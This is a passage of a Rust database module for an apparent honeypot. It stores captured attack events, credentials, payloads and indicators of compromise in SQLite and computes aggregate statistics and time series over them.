//! Database module

mod schema;
pub mod write_buffer;

use anyhow::Result;
use chrono::{DateTime, Datelike, TimeZone, Timelike, Utc};
use serde::{Deserialize, Serialize};
use sqlx::{sqlite::SqlitePoolOptions, FromRow, Pool, Sqlite};
use std::collections::{HashMap, HashSet};

use crate::config::DatabaseConfig;
use crate::ioc::{self, IocItem};

pub use write_buffer::{start_write_buffer, WriteSender};

const DAY_MS: i64 = 86_400_000;
const HOUR_MS: i64 = 3_600_000;

/// Represents an attack event captured by the honeypot
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackEvent {
    pub id: Option<i64>,
    pub timestamp: DateTime<Utc>,
    pub ip: String,
    pub country_code: Option<String>,
    pub latitude: Option<f64>,
    pub longitude: Option<f64>,
    pub service: String,
    pub port: u16,
    pub request: String,
    pub payload: Option<String>,
    pub http_path: Option<String>,
    pub username: Option<String>,
    pub password: Option<String>,
    pub user_agent: Option<String>,
    pub request_size: u32,
    #[serde(default)]
    pub asn: Option<u32>,
    #[serde(default)]
    pub asn_org: Option<String>,
    #[serde(default)]
    pub tags: Vec<String>,
    #[serde(default)]
    pub is_scanner: bool,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub iocs: Vec<IocItem>,
}

impl AttackEvent {
    pub fn new(ip: String, service: String, port: u16, request: String) -> Self {
        Self {
            id: None,
            timestamp: Utc::now(),
            ip,
            country_code: None,
            latitude: None,
            longitude: None,
            service,
            port,
            request,
            payload: None,
            http_path: None,
            username: None,
            password: None,
            user_agent: None,
            request_size: 0,
            asn: None,
            asn_org: None,
            tags: Vec::new(),
            is_scanner: false,
            iocs: Vec::new(),
        }
    }

    pub fn with_credentials(mut self, username: String, password: String) -> Self {
        self.username = Some(username);
        self.password = Some(password);
        self
    }

    pub fn with_payload(mut self, payload: Vec<u8>) -> Self {
        self.payload = Some(hex::encode(&payload));
        self
    }

    pub fn with_geo(mut self, country_code: String, lat: f64, lon: f64) -> Self {
        self.country_code = Some(country_code);
        self.latitude = Some(lat);
        self.longitude = Some(lon);
        self
    }

    pub fn with_user_agent(mut self, user_agent: String) -> Self {
        self.user_agent = Some(user_agent);
        self
    }

    pub fn with_request_size(mut self, size: u32) -> Self {
        self.request_size = size;
        self
    }

    pub fn with_tag(mut self, tag: impl Into<String>) -> Self {
        let t = tag.into();
        if !self.tags.iter().any(|existing| existing == &t) {
            self.tags.push(t);
        }
        self
    }

    pub fn with_iocs(mut self, iocs: Vec<IocItem>) -> Self {
        self.iocs = iocs;
        self
    }
}

#[derive(Clone)]
pub struct Database {
    pool: Pool<Sqlite>,
}

impl Database {
    pub async fn new(config: &DatabaseConfig) -> Result<Self> {
        let cache_size_kb = (config.cache_size_mb as i32) * 1000;

        let pool = SqlitePoolOptions::new()
            .max_connections(8)
            .acquire_timeout(std::time::Duration::from_secs(30))
            .after_connect(move |conn, _meta| {
                Box::pin(async move {
                    sqlx::query("PRAGMA synchronous = NORMAL")
                        .execute(&mut *conn)
                        .await?;
                    sqlx::query(sqlx::AssertSqlSafe(format!(
                        "PRAGMA cache_size = -{}",
                        cache_size_kb
                    )))
                    .execute(&mut *conn)
                    .await?;
                    sqlx::query("PRAGMA temp_store = MEMORY")
                        .execute(&mut *conn)
                        .await?;
                    Ok(())
                })
            })
            .connect(&format!("sqlite:{}?mode=rwc&cache=shared", config.url))
            .await?;
        Ok(Self { pool })
    }

    async fn ensure_column(&self, table: &str, col: &str, col_def: &str) -> Result<()> {
        let pragma_sql = format!("PRAGMA table_info({})", table);
        let rows: Vec<(i64, String, String, i64, Option<String>, i64)> =
            sqlx::query_as(sqlx::AssertSqlSafe(pragma_sql))
                .fetch_all(&self.pool)
                .await?;
        if !rows.iter().any(|(_, name, _, _, _, _)| name == col) {
            let alter_sql = format!("ALTER TABLE {} ADD COLUMN {} {}", table, col, col_def);
            sqlx::query(sqlx::AssertSqlSafe(alter_sql))
                .execute(&self.pool)
                .await?;
        }
        Ok(())
    }

    pub async fn run_migrations(&self) -> Result<()> {
        sqlx::query("PRAGMA auto_vacuum = INCREMENTAL")
            .execute(&self.pool)
            .await?;
        sqlx::query("PRAGMA journal_mode=WAL")
            .execute(&self.pool)
            .await?;

        sqlx::query(schema::CREATE_TABLE).execute(&self.pool).await?;
        sqlx::query(schema::CREATE_STATS_DAILY_TABLE)
            .execute(&self.pool)
            .await?;
        sqlx::query(schema::CREATE_IOCS_TABLE)
            .execute(&self.pool)
            .await?;

        // Idempotent column upgrades for existing databases
        self.ensure_column("requests", "asn", "INTEGER").await?;
        self.ensure_column("requests", "asn_org", "TEXT").await?;
        self.ensure_column("requests", "tags", "TEXT").await?;
        self.ensure_column("requests", "is_scanner", "INTEGER DEFAULT 0")
            .await?;

        self.ensure_column("stats_daily", "command_counts", "TEXT")
            .await?;
        self.ensure_column("stats_daily", "user_agent_counts", "TEXT")
            .await?;
        self.ensure_column("stats_daily", "port_counts", "TEXT")
            .await?;
        self.ensure_column("stats_daily", "tag_counts", "TEXT")
            .await?;
        self.ensure_column("stats_daily", "asn_counts", "TEXT")
            .await?;

        // Covering indexes
        sqlx::query(schema::CREATE_INDEX_TS_SERVICE)
            .execute(&self.pool)
            .await?;
        sqlx::query(schema::CREATE_INDEX_TS_COUNTRY)
            .execute(&self.pool)
            .await?;
        sqlx::query(schema::CREATE_INDEX_TS_HTTP_PATH)
            .execute(&self.pool)
            .await?;
        sqlx::query(schema::CREATE_INDEX_TS_LOCATION)
            .execute(&self.pool)
            .await?;
        sqlx::query(schema::CREATE_INDEX_TS_IP)
            .execute(&self.pool)
            .await?;
        sqlx::query(schema::CREATE_INDEX_IOCS_TS)
            .execute(&self.pool)
            .await?;
        sqlx::query(schema::CREATE_INDEX_IOCS_VALUE)
            .execute(&self.pool)
            .await?;

        for stmt in schema::DROP_UNUSED_INDEXES {
            sqlx::query(*stmt).execute(&self.pool).await?;
        }

        Ok(())
    }

    // ==================== WRITE OPERATIONS ====================

    #[allow(dead_code)]
    pub async fn insert_event(&self, event: &AttackEvent) -> Result<i64> {
        let tags_str = tags_to_db(&event.tags);
        let ts_ms = event.timestamp.timestamp_millis();

        let result = sqlx::query(
            r#"
            INSERT INTO requests (timestamp, ip, country_code, latitude, longitude, service, port, request, payload, http_path, username, password, user_agent, request_size, asn, asn_org, tags, is_scanner)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            "#,
        )
        .bind(ts_ms)
        .bind(&event.ip)
        .bind(&event.country_code)
        .bind(event.latitude)
        .bind(event.longitude)
        .bind(&event.service)
        .bind(event.port as i32)
        .bind(&event.request)
        .bind(&event.payload)
        .bind(&event.http_path)
        .bind(&event.username)
        .bind(&event.password)
        .bind(&event.user_agent)
        .bind(event.request_size as i32)
        .bind(event.asn.map(|v| v as i64))
        .bind(&event.asn_org)
        .bind(&tags_str)
        .bind(if event.is_scanner { 1i32 } else { 0i32 })
        .execute(&self.pool)
        .await?;

        for item in &event.iocs {
            sqlx::query(
                "INSERT INTO iocs (timestamp, ip, service, ioc_type, value, context) VALUES (?, ?, ?, ?, ?, ?)",
            )
            .bind(ts_ms)
            .bind(&event.ip)
            .bind(&event.service)
            .bind(&item.ioc_type)
            .bind(&item.value)
            .bind(&item.context)
            .execute(&self.pool)
            .await?;
        }

        Ok(result.last_insert_rowid())
    }

    /// Batch insert events and extracted IOCs in a single transaction
    pub async fn batch_insert_events(&self, events: &[AttackEvent]) -> Result<()> {
        if events.is_empty() {
            return Ok(());
        }

        let mut tx = self.pool.begin().await?;

        for event in events {
            let tags_str = tags_to_db(&event.tags);
            let ts_ms = event.timestamp.timestamp_millis();

            sqlx::query(
                r#"
                INSERT INTO requests (timestamp, ip, country_code, latitude, longitude, service, port, request, payload, http_path, username, password, user_agent, request_size, asn, asn_org, tags, is_scanner)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                "#,
            )
            .bind(ts_ms)
            .bind(&event.ip)
            .bind(&event.country_code)
            .bind(event.latitude)
            .bind(event.longitude)
            .bind(&event.service)
            .bind(event.port as i32)
            .bind(&event.request)
            .bind(&event.payload)
            .bind(&event.http_path)
            .bind(&event.username)
            .bind(&event.password)
            .bind(&event.user_agent)
            .bind(event.request_size as i32)
            .bind(event.asn.map(|v| v as i64))
            .bind(&event.asn_org)
            .bind(&tags_str)
            .bind(if event.is_scanner { 1i32 } else { 0i32 })
            .execute(&mut *tx)
            .await?;

            for item in &event.iocs {
                sqlx::query(
                    "INSERT INTO iocs (timestamp, ip, service, ioc_type, value, context) VALUES (?, ?, ?, ?, ?, ?)",
                )
                .bind(ts_ms)
                .bind(&event.ip)
                .bind(&event.service)
                .bind(&item.ioc_type)
                .bind(&item.value)
                .bind(&item.context)
                .execute(&mut *tx)
                .await?;
            }
        }

        tx.commit().await?;
        Ok(())
    }

    // ==================== BASIC READ OPERATIONS ====================

    /// Get total request count using MAX(rowid) for O(1) performance,
    /// falling back to sqlite_sequence if all rows in `requests` were pruned.
    pub async fn get_total_count(&self) -> Result<i64> {
        let row: (Option<i64>,) = sqlx::query_as("SELECT MAX(rowid) FROM requests")
            .fetch_one(&self.pool)
            .await?;
        if let Some(max_id) = row.0 {
            return Ok(max_id);
        }

        let seq: Option<(i64,)> =
            sqlx::query_as("SELECT seq FROM sqlite_sequence WHERE name = 'requests'")
                .fetch_optional(&self.pool)
                .await
                .unwrap_or(None);
        Ok(seq.map(|(s,)| s).unwrap_or(0))
    }

    pub async fn get_recent_credentials(&self, limit: i32) -> Result<Vec<(String, String)>> {
        let rows: Vec<(String, String)> = sqlx::query_as(
            "SELECT username, password FROM requests WHERE username IS NOT NULL ORDER BY id DESC LIMIT ?",
        )
        .bind(limit)
        .fetch_all(&self.pool)
        .await?;
        Ok(rows)
    }

    /// Get recent commands from SSH/telnet sessions (stored in payload as hex-encoded text)
    pub async fn get_recent_commands(&self, limit: i32) -> Result<Vec<String>> {
        let rows: Vec<(String,)> = sqlx::query_as(
            r#"
            SELECT payload FROM requests
            WHERE payload IS NOT NULL
            AND (service = 'ssh' OR service = 'ssh-alt' OR service = 'telnet' OR service = 'telnet-alt')
            ORDER BY id DESC
            LIMIT ?
            "#,
        )
        .bind(limit * 5)
        .fetch_all(&self.pool)
        .await?;

        let mut commands = Vec::new();
        for (hex_payload,) in rows {
            if let Ok(bytes) = hex::decode(&hex_payload) {
                if let Ok(text) = String::from_utf8(bytes) {
                    for line in text.lines() {
                        let cmd = line.trim();
                        if !cmd.is_empty() && commands.len() < limit as usize {
                            commands.push(cmd.to_string());
                        }
                    }
                }
            }
        }

        commands.truncate(limit as usize);
        Ok(commands)
    }

    pub async fn get_recent_events(&self, limit: i32) -> Result<Vec<AttackEvent>> {
        #[derive(FromRow)]
        struct EventRow {
            id: i64,
            timestamp: i64,
            ip: String,
            country_code: Option<String>,
            latitude: Option<f64>,
            longitude: Option<f64>,
            service: String,
            port: i32,
            request: Option<String>,
            payload: Option<String>,
            http_path: Option<String>,
            username: Option<String>,
            password: Option<String>,
            user_agent: Option<String>,
            request_size: i32,
            asn: Option<i64>,
            asn_org: Option<String>,
            tags: Option<String>,
            is_scanner: i32,
        }

        let rows: Vec<EventRow> = sqlx::query_as(
            r#"
            SELECT id, timestamp, ip, country_code, latitude, longitude, service, port,
                   request, payload, http_path, username, password, user_agent,
                   COALESCE(request_size, 0) AS request_size, asn, asn_org, tags,
                   COALESCE(is_scanner, 0) AS is_scanner
            FROM requests
            ORDER BY id DESC
            LIMIT ?
            "#,
        )
        .bind(limit)
        .fetch_all(&self.pool)
        .await?;

        Ok(rows
            .into_iter()
            .map(|r| {
                let request_text = r.request.unwrap_or_default();
                let decoded_payload = r
                    .payload
                    .as_deref()
                    .and_then(|h| hex::decode(h).ok())
                    .map(|b| String::from_utf8_lossy(&b).into_owned());
                let extracted_iocs = ioc::extract_iocs_for_event(
                    &r.service,
                    &request_text,
                    r.http_path.as_deref(),
                    decoded_payload.as_deref(),
                );

                AttackEvent {
                    id: Some(r.id),
                    timestamp: DateTime::from_timestamp_millis(r.timestamp).unwrap_or_else(Utc::now),
                    ip: r.ip,
                    country_code: r.country_code,
                    latitude: r.latitude,
                    longitude: r.longitude,
                    service: r.service,
                    port: r.port as u16,
                    request: request_text,
                    payload: r.payload,
                    http_path: r.http_path,
                    username: r.username,
                    password: r.password,
                    user_agent: r.user_agent,
                    request_size: r.request_size as u32,
                    asn: r.asn.map(|v| v as u32),
                    asn_org: r.asn_org,
                    tags: db_to_tags(r.tags.as_deref()),
                    is_scanner: r.is_scanner != 0,
                    iocs: extracted_iocs,
                }
            })
            .collect())
    }

    // ==================== HYBRID STATS (ROLLUP + LIVE TODAY) ====================

    fn window_bounds(since_hours: i64) -> (i64, i64, i64) {
        let now = Utc::now();
        let today_start = utc_today_start(now);
        let since_ts = now.timestamp_millis() - (since_hours * HOUR_MS);
        let first_complete_day = ts_to_day_bucket(since_ts) + DAY_MS;
        (today_start, since_ts, first_complete_day)
    }

    /// Get stats using hybrid approach:
    /// - `since_hours <= 24`: live query over the last `since_hours` hours
    /// - `since_hours > 24`: merge completed days from `stats_daily` + today's live rows
    pub async fn get_stats_hybrid(&self, since_hours: i64) -> Result<StatsResponse> {
        let (today_start, since_ts, first_complete_day) = Self::window_bounds(since_hours);

        if since_hours <= 24 {
            return self.get_live_stats(since_ts).await;
        }

        let (rollup, live) = tokio::join!(
            async {
                if first_complete_day < today_start {
                    self.get_rollup_stats(first_complete_day, today_start).await
                } else {
                    Ok(StatsResponse::default())
                }
            },
            self.get_live_stats(today_start)
        );

        let rollup = rollup?;
        let live = live?;

        Ok(StatsResponse {
            total: rollup.total + live.total,
            services: merge_service_stats(rollup.services, live.services),
            credentials: merge_credential_stats(rollup.credentials, live.credentials),
            paths: merge_path_stats(rollup.paths, live.paths),
        })
    }

    async fn get_rollup_stats(&self, since_day: i64, before_day: i64) -> Result<StatsResponse> {
        let rows: Vec<(i64, Option<String>, Option<String>, Option<String>)> = sqlx::query_as(
            r#"
            SELECT total_requests, service_counts, credential_counts, path_counts
            FROM stats_daily
            WHERE day_bucket >= ? AND day_bucket < ?
            "#,
        )
        .bind(since_day)
        .bind(before_day)
        .fetch_all(&self.pool)
        .await?;

        if rows.is_empty() {
            return Ok(StatsResponse::default());
        }

        let mut total = 0i64;
        let mut services: HashMap<String, i64> = HashMap::new();
        let mut credentials: HashMap<(String, String), i64> = HashMap::new();
        let mut paths: HashMap<String, i64> = HashMap::new();

        for (req_count, service_json, cred_json, path_json) in rows {
            total += req_count;

            if let Some(json) = service_json {
                if let Ok(map) = serde_json::from_str::<HashMap<String, i64>>(&json) {
                    for (k, v) in map {
                        *services.entry(k).or_insert(0) += v;
                    }
                }
            }

            if let Some(json) = cred_json {
                if let Ok(list) = serde_json::from_str::<Vec<CredentialCount>>(&json) {
                    for c in list {
                        *credentials.entry((c.u, c.p)).or_insert(0) += c.c;
                    }
                }
            }

            if let Some(json) = path_json {
                if let Ok(map) = serde_json::from_str::<HashMap<String, i64>>(&json) {
                    for (k, v) in map {
                        *paths.entry(k).or_insert(0) += v;
                    }
                }
            }
        }

        let total_for_pct = total as f64;
        let mut services: Vec<ServiceStat> = services
            .into_iter()
            .map(|(service, count)| ServiceStat {
                service,
                count,
                percentage: if total > 0 {
                    (count as f64 / total_for_pct) * 100.0
                } else {
                    0.0
                },
            })
            .collect();
        services.sort_by(|a, b| b.count.cmp(&a.count));

        let mut credentials: Vec<CredentialStat> = credentials
            .into_iter()
            .map(|((username, password), count)| CredentialStat {
                username,
                password,
                count,
            })
            .collect();
        credentials.sort_by(|a, b| b.count.cmp(&a.count));
        credentials.truncate(50);

        let mut paths: Vec<PathStat> = paths
            .into_iter()
            .map(|(path, count)| PathStat { path, count })
            .collect();
        paths.sort_by(|a, b| b.count.cmp(&a.count));
        paths.truncate(50);

        Ok(StatsResponse {
            total,
            services,
            credentials,
            paths,
        })
    }

    async fn get_live_stats(&self, since_ts: i64) -> Result<StatsResponse> {
        let (total, services, credentials, paths) = tokio::join!(
            self.get_filtered_count(since_ts),
            self.get_service_stats_raw(since_ts),
            self.get_top_credentials_raw(since_ts, 50),
            self.get_top_paths_raw(since_ts, 50)
        );

        Ok(StatsResponse {
            total: total.unwrap_or(0),
            services: services.unwrap_or_default(),
            credentials: credentials.unwrap_or_default(),
            paths: paths.unwrap_or_default(),
        })
    }

    async fn get_filtered_count(&self, since_ts: i64) -> Result<i64> {
        let row: (i64,) = sqlx::query_as("SELECT COUNT(*) FROM requests WHERE timestamp >= ?")
            .bind(since_ts)
            .fetch_one(&self.pool)
            .await?;
        Ok(row.0)
    }

    /// Fast O(30) + today index-scan count for the last 30 days
    pub async fn get_last_30_days_count(&self) -> Result<i64> {
        let (today_start, _, first_complete_day) = Self::window_bounds(720);
        let (rollup_total,): (i64,) = sqlx::query_as(
            "SELECT COALESCE(SUM(total_requests), 0) FROM stats_daily WHERE day_bucket >= ? AND day_bucket < ?",
        )
        .bind(first_complete_day)
        .bind(today_start)
        .fetch_one(&self.pool)
        .await
        .unwrap_or((0,));

        let today_total = self.get_filtered_count(today_start).await.unwrap_or(0);
        Ok(rollup_total + today_total)
    }

    async fn get_service_stats_raw(&self, since_ts: i64) -> Result<Vec<ServiceStat>> {
        let rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT service, COUNT(*) as count FROM requests WHERE timestamp >= ? GROUP BY service ORDER BY count DESC",
        )
        .bind(since_ts)
        .fetch_all(&self.pool)
        .await?;

        let total: i64 = rows.iter().map(|(_, c)| c).sum();
        Ok(rows
            .into_iter()
            .map(|(service, count)| ServiceStat {
                service,
                count,
                percentage: if total > 0 {
                    (count as f64 / total as f64) * 100.0
                } else {
                    0.0
                },
            })
            .collect())
    }

    async fn get_top_credentials_raw(
        &self,
        since_ts: i64,
        limit: i32,
    ) -> Result<Vec<CredentialStat>> {
        // Unary `+` prevents SQLite from scanning partial legacy indexes and forces timestamp range scan.
        let rows: Vec<(String, String, i64)> = sqlx::query_as(
            r#"
            SELECT username, password, COUNT(*) as count
            FROM requests
            WHERE timestamp >= ? AND +username IS NOT NULL
            GROUP BY username, password
            ORDER BY count DESC
            LIMIT ?
            "#,
        )
        .bind(since_ts)
        .bind(limit)
        .fetch_all(&self.pool)
        .await?;

        Ok(rows
            .into_iter()
            .map(|(username, password, count)| CredentialStat {
                username,
                password,
                count,
            })
            .collect())
    }

    async fn get_top_paths_raw(&self, since_ts: i64, limit: i32) -> Result<Vec<PathStat>> {
        let rows: Vec<(String, i64)> = sqlx::query_as(
            r#"
            SELECT http_path, COUNT(*) as count
            FROM requests
            WHERE timestamp >= ? AND http_path IS NOT NULL
            GROUP BY http_path
            ORDER BY count DESC
            LIMIT ?
            "#,
        )
        .bind(since_ts)
        .bind(limit)
        .fetch_all(&self.pool)
        .await?;

        Ok(rows
            .into_iter()
            .map(|(path, count)| PathStat { path, count })
            .collect())
    }

    // ==================== COUNTRY & LOCATION STATS ====================

    pub async fn get_country_stats(&self, since_hours: i64) -> Result<Vec<CountryStat>> {
        let (today_start, since_ts, first_complete_day) = Self::window_bounds(since_hours);
        let mut countries: HashMap<String, i64> = HashMap::new();

        if since_hours > 24 && first_complete_day < today_start {
            let rollup_rows: Vec<(Option<String>,)> = sqlx::query_as(
                "SELECT country_counts FROM stats_daily WHERE day_bucket >= ? AND day_bucket < ?",
            )
            .bind(first_complete_day)
            .bind(today_start)
            .fetch_all(&self.pool)
            .await?;

            for (json,) in rollup_rows {
                if let Some(json) = json {
                    if let Ok(map) = serde_json::from_str::<HashMap<String, i64>>(&json) {
                        for (k, v) in map {
                            *countries.entry(k).or_insert(0) += v;
                        }
                    }
                }
            }
        }

        let live_since = if since_hours <= 24 { since_ts } else { today_start };
        let live_rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT country_code, COUNT(*) FROM requests WHERE timestamp >= ? AND country_code IS NOT NULL GROUP BY country_code",
        )
        .bind(live_since)
        .fetch_all(&self.pool)
        .await?;

        for (code, count) in live_rows {
            *countries.entry(code).or_insert(0) += count;
        }

        let mut result: Vec<CountryStat> = countries
            .into_iter()
            .map(|(country_code, count)| CountryStat {
                country_code,
                count,
            })
            .collect();
        result.sort_by(|a, b| b.count.cmp(&a.count));
        Ok(result)
    }

    pub async fn get_location_stats(&self, since_hours: i64, limit: i32) -> Result<Vec<LocationStat>> {
        let (today_start, since_ts, first_complete_day) = Self::window_bounds(since_hours);
        let mut locations: HashMap<(i64, i64), i64> = HashMap::new();

        if since_hours > 24 && first_complete_day < today_start {
            let rollup_rows: Vec<(Option<String>,)> = sqlx::query_as(
                "SELECT location_counts FROM stats_daily WHERE day_bucket >= ? AND day_bucket < ?",
            )
            .bind(first_complete_day)
            .bind(today_start)
            .fetch_all(&self.pool)
            .await?;

            for (json,) in rollup_rows {
                if let Some(json) = json {
                    if let Ok(list) = serde_json::from_str::<Vec<LocationCount>>(&json) {
                        for loc in list {
                            let key = ((loc.lat * 10.0).round() as i64, (loc.lon * 10.0).round() as i64);
                            *locations.entry(key).or_insert(0) += loc.c;
                        }
                    }
                }
            }
        }

        let live_since = if since_hours <= 24 { since_ts } else { today_start };
        let live_rows: Vec<(f64, f64, i64)> = sqlx::query_as(
            r#"SELECT ROUND(latitude, 1), ROUND(longitude, 1), COUNT(*) as c
               FROM requests WHERE timestamp >= ? AND latitude IS NOT NULL
               GROUP BY ROUND(latitude, 1), ROUND(longitude, 1)
               ORDER BY c DESC LIMIT ?"#,
        )
        .bind(live_since)
        .bind(limit)
        .fetch_all(&self.pool)
        .await?;

        for (lat, lon, c) in live_rows {
            let key = ((lat * 10.0).round() as i64, (lon * 10.0).round() as i64);
            *locations.entry(key).or_insert(0) += c;
        }

        let mut result: Vec<LocationStat> = locations
            .into_iter()
            .map(|((lat_key, lon_key), count)| LocationStat {
                lat: lat_key as f64 / 10.0,
                lon: lon_key as f64 / 10.0,
                count,
            })
            .collect();
        result.sort_by(|a, b| b.count.cmp(&a.count));
        result.truncate(limit as usize);
        Ok(result)
    }

    // ==================== IP STATS ====================

    pub async fn get_top_ips_by_requests(&self, since_hours: i64, limit: i32) -> Result<Vec<IpStat>> {
        let (today_start, since_ts, first_complete_day) = Self::window_bounds(since_hours);
        let mut ip_counts: HashMap<String, i64> = HashMap::new();

        if since_hours > 24 && first_complete_day < today_start {
            let rollup_rows: Vec<(Option<String>,)> = sqlx::query_as(
                "SELECT ip_request_counts FROM stats_daily WHERE day_bucket >= ? AND day_bucket < ?",
            )
            .bind(first_complete_day)
            .bind(today_start)
            .fetch_all(&self.pool)
            .await?;

            for (json,) in rollup_rows {
                if let Some(json) = json {
                    if let Ok(map) = serde_json::from_str::<HashMap<String, i64>>(&json) {
                        for (ip, count) in map {
                            *ip_counts.entry(ip).or_insert(0) += count;
                        }
                    }
                }
            }
        }

        let live_since = if since_hours <= 24 { since_ts } else { today_start };
        let live_rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT ip, COUNT(*) as c FROM requests WHERE timestamp >= ? GROUP BY ip ORDER BY c DESC LIMIT 100",
        )
        .bind(live_since)
        .fetch_all(&self.pool)
        .await?;

        for (ip, count) in live_rows {
            *ip_counts.entry(ip).or_insert(0) += count;
        }

        let mut result: Vec<IpStat> = ip_counts
            .into_iter()
            .map(|(ip, count)| IpStat { ip, count })
            .collect();
        result.sort_by(|a, b| b.count.cmp(&a.count));
        result.truncate(limit as usize);
        Ok(result)
    }

    pub async fn get_top_ips_by_bandwidth(&self, since_hours: i64, limit: i32) -> Result<Vec<IpStat>> {
        let (today_start, since_ts, first_complete_day) = Self::window_bounds(since_hours);
        let mut ip_bytes: HashMap<String, i64> = HashMap::new();

        if since_hours > 24 && first_complete_day < today_start {
            let rollup_rows: Vec<(Option<String>,)> = sqlx::query_as(
                "SELECT ip_bytes_counts FROM stats_daily WHERE day_bucket >= ? AND day_bucket < ?",
            )
            .bind(first_complete_day)
            .bind(today_start)
            .fetch_all(&self.pool)
            .await?;

            for (json,) in rollup_rows {
                if let Some(json) = json {
                    if let Ok(map) = serde_json::from_str::<HashMap<String, i64>>(&json) {
                        for (ip, bytes) in map {
                            *ip_bytes.entry(ip).or_insert(0) += bytes;
                        }
                    }
                }
            }
        }

        let live_since = if since_hours <= 24 { since_ts } else { today_start };
        let live_rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT ip, COALESCE(SUM(request_size), 0) as bytes FROM requests WHERE timestamp >= ? GROUP BY ip ORDER BY bytes DESC LIMIT 100",
        )
        .bind(live_since)
        .fetch_all(&self.pool)
        .await?;

        for (ip, bytes) in live_rows {
            *ip_bytes.entry(ip).or_insert(0) += bytes;
        }

        let mut result: Vec<IpStat> = ip_bytes
            .into_iter()
            .map(|(ip, count)| IpStat { ip, count })
            .collect();
        result.sort_by(|a, b| b.count.cmp(&a.count));
        result.truncate(limit as usize);
        Ok(result)
    }

    pub async fn get_total_bytes(&self, since_hours: i64) -> Result<i64> {
        let (today_start, since_ts, first_complete_day) = Self::window_bounds(since_hours);
        let mut total_bytes: i64 = 0;

        if since_hours > 24 && first_complete_day < today_start {
            let (rollup_bytes,): (i64,) = sqlx::query_as(
                "SELECT COALESCE(SUM(total_bytes), 0) FROM stats_daily WHERE day_bucket >= ? AND day_bucket < ?",
            )
            .bind(first_complete_day)
            .bind(today_start)
            .fetch_one(&self.pool)
            .await
            .unwrap_or((0,));
            total_bytes += rollup_bytes;
        }

        let live_since = if since_hours <= 24 { since_ts } else { today_start };
        let (live_bytes,): (i64,) = sqlx::query_as(
            "SELECT COALESCE(SUM(request_size), 0) FROM requests WHERE timestamp >= ?",
        )
        .bind(live_since)
        .fetch_one(&self.pool)
        .await
        .unwrap_or((0,));

        Ok(total_bytes + live_bytes)
    }

    // ==================== TIME-SERIES & SPIKE DETECTION ====================

    pub async fn get_timeseries(&self, since_hours: i64) -> Result<TimeSeriesResponse> {
        let now = Utc::now();
        let now_ms = now.timestamp_millis();

        if since_hours <= 24 {
            let current_hour = (now_ms / HOUR_MS) * HOUR_MS;
            let num_hours = since_hours.max(1);
            let start_hour = current_hour - (num_hours - 1) * HOUR_MS;

            let rows: Vec<(i64, String, i64)> = sqlx::query_as(
                r#"
                SELECT (timestamp / 3600000) * 3600000 AS bucket, service, COUNT(*)
                FROM requests
                WHERE timestamp >= ?
                GROUP BY bucket, service
                ORDER BY bucket ASC
                "#,
            )
            .bind(start_hour)
            .fetch_all(&self.pool)
            .await?;

            let mut bucket_map: HashMap<i64, HashMap<String, i64>> = HashMap::new();
            let mut service_totals: HashMap<String, i64> = HashMap::new();

            for (bucket, service, count) in rows {
                *bucket_map
                    .entry(bucket)
                    .or_default()
                    .entry(service.clone())
                    .or_insert(0) += count;
                *service_totals.entry(service).or_insert(0) += count;
            }

            let top_services = top_n_keys(&service_totals, 5);
            let top_set: HashSet<&str> = top_services.iter().map(|s| s.as_str()).collect();

            let mut raw_points = Vec::with_capacity(num_hours as usize);
            for i in 0..num_hours {
                let ts = start_hour + i * HOUR_MS;
                let partial = ts == current_hour;
                let label = DateTime::from_timestamp_millis(ts)
                    .map(|dt| format!("{:02}:00", dt.hour()))
                    .unwrap_or_default();

                let raw_services = bucket_map.remove(&ts).unwrap_or_default();
                let (total, services) = compress_bucket_services(raw_services, &top_set);
                raw_points.push(TimeSeriesPoint {
                    timestamp: ts,
                    label,
                    total,
                    services,
                    is_spike: false,
                    baseline: 0.0,
                    multiplier: 0.0,
                    partial,
                });
            }

            let spikes = annotate_spikes(&mut raw_points);
            return Ok(TimeSeriesResponse {
                granularity: "hour".to_string(),
                top_services,
                points: raw_points,
                spikes,
            });
        }

        // Daily granularity from stats_daily + live today
        let today_start = utc_today_start(now);
        let since_ts = now_ms - (since_hours * HOUR_MS);
        let first_day = ts_to_day_bucket(since_ts) + DAY_MS;

        let mut day_buckets: HashMap<i64, HashMap<String, i64>> = HashMap::new();
        let mut service_totals: HashMap<String, i64> = HashMap::new();

        if first_day < today_start {
            let rows: Vec<(i64, Option<String>)> = sqlx::query_as(
                "SELECT day_bucket, service_counts FROM stats_daily WHERE day_bucket >= ? AND day_bucket < ? ORDER BY day_bucket ASC",
            )
            .bind(first_day)
            .bind(today_start)
            .fetch_all(&self.pool)
            .await?;

            for (day, json) in rows {
                if let Some(json) = json {
                    if let Ok(map) = serde_json::from_str::<HashMap<String, i64>>(&json) {
                        for (svc, cnt) in &map {
                            *service_totals.entry(svc.clone()).or_insert(0) += *cnt;
                        }
                        day_buckets.insert(day, map);
                    }
                }
            }
        }

        // Today's live partial day
        let today_rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT service, COUNT(*) FROM requests WHERE timestamp >= ? GROUP BY service",
        )
        .bind(today_start)
        .fetch_all(&self.pool)
        .await?;

        let mut today_map = HashMap::new();
        for (svc, cnt) in today_rows {
            *service_totals.entry(svc.clone()).or_insert(0) += cnt;
            today_map.insert(svc, cnt);
        }
        day_buckets.insert(today_start, today_map);

        let top_services = top_n_keys(&service_totals, 5);
        let top_set: HashSet<&str> = top_services.iter().map(|s| s.as_str()).collect();

        let total_days = ((today_start - first_day) / DAY_MS).max(0) + 1;
        let mut points = Vec::with_capacity(total_days as usize);
        let mut cursor = first_day.min(today_start);

        while cursor <= today_start {
            let partial = cursor == today_start;
            let label = DateTime::from_timestamp_millis(cursor)
                .map(|dt| dt.format("%b %d").to_string())
                .unwrap_or_default();

            let raw_services = day_buckets.remove(&cursor).unwrap_or_default();
            let (total, services) = compress_bucket_services(raw_services, &top_set);
            points.push(TimeSeriesPoint {
                timestamp: cursor,
                label,
                total,
                services,
                is_spike: false,
                baseline: 0.0,
                multiplier: 0.0,
                partial,
            });
            cursor += DAY_MS;
        }

